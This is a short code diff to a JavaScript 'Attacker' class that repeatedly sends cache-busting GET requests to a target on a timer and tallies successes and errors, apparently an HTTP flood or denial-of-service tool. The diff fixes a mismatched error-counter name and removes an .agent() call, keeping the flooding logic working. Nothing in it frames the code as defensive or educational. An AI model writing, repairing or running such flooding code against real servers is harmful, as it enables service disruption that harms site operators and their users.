@@ -12,7 +12,7 @@ export class Attacker {
                 this.attack(target);
             }
             this.stats.loop += 1;
-            console.log(`Target: ${this.stats.target} | Loop: ${this.stats.loop} | Success: ${this.stats.success} | Error: ${this.stats.errors}`);
+            console.log(`Target: ${this.stats.target} | Loop: ${this.stats.loop} | Success: ${this.stats.success} | Error: ${this.stats.error}`);
         }, interval);
     }
 
@@ -26,8 +26,7 @@ export class Attacker {
             .get(target)
             .set('Cache-Control', 'no-cache')
             .set('Keep-Alive', 'timeout=30, max=1')
-            .agent()
             .timeout(5000)
-            .end((err) => err ? this.stats.errors += 1 : this.stats.success += 1);
+            .end((err) => err ? this.stats.error += 1 : this.stats.success += 1);
     }
 }
